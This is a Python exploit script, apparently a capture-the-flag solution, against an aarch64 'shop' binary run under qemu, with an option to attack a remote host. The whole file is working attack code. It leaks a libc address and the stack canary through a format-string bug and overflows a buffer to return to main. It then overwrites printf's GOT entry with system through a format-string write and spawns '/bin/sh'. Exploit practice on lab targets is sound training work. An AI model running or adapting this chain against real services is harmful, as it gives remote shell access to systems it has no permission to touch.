#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'info'
exe = context.binary = ELF('./shop_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-aarch64","-g","5000", "-L", "/usr/arm-linux-gnueabi/", exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["qemu-aarch64", "-L", "/usr/arm-linux-gnueabi/", exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def ret2main():

  sa(b'> ', b'%9$p|%17$p')
  ru(b'hi ')
  output = rl()[:-1].split(b'|')
  canary = int(output[1], 16)
  libc.address = int(output[0],16) - 0x273fc
  slog('Libc base',libc.address)
  slog('Canary', canary)

  pl = flat(
    b'A'*104,
    canary,
    b'B'*8,
    exe.sym.main
    )

  sla(b'> ',b'2')
  sla(b'> ', b'1')
  sla(b'> ', b'2000000')
  sla(b'> ', pl)

def write_printf_to_system():

    system = libc.sym.system
    printf = exe.got.printf

    slog('System',system)
    slog('Printf', printf)

    byte = (system >> 16) & 0xff
    two_bytes = system & 0xffff

    pl = f'%{byte}c%15$hhn'.encode()
    pl += f'%{two_bytes - byte - len(pl) + 0xc}c%16$hn'.encode()
    pl = pl.ljust(32, b'.')
    pl += p64(printf + 2)
    pl += p64(printf)

    sa(b'> ', pl)

def get_shell():

    sl(b'1')
    sl(b'/bin/sh\0')

def exploit():

  ret2main()
  write_printf_to_system()
  # ret2main()
  get_shell()

  interactive()

if __name__ == '__main__':
  exploit()


